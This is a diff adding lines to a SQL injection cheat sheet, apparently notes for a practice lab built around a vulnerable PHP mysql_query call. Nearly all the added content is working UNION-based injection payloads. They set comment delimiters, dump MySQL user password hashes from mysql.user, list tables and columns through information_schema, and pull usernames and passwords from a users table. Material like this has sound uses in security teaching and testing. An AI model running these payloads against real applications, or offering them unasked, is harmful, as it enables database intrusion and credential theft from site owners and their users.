@@ -30,6 +30,9 @@ $result=mysql_query($getid) or die('
 ' );
 ```
 
+MySQL delimiter: `#`
+SQL delimiter: `--
+
 * Figure out how many columns are there:
 
 `‘ ORDER BY 1#`
@@ -44,3 +47,19 @@ etc.
 * Find out the database the user is running as and the name of the database:
 
 `‘ UNION ALL SELECT user(),database()#`
+
+* Dump MySQL hash:
+
+`‘ UNION ALL SELECT user,password FROM mysql.user#`
+
+* Find out the table name:
+
+`‘ UNION ALL SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema LIKE ‘%[database name]%’ #`
+
+* Find out columns in a table:
+
+`‘ UNION ALL SELECT table_schema, column_name FROM information_schema.columns WHERE table_schema LIKE ‘%[database name]%’ #`
+
+* Dump username and password from `example.users` table:
+
+`‘ UNION ALL SELECT user, password FROM example.users #`
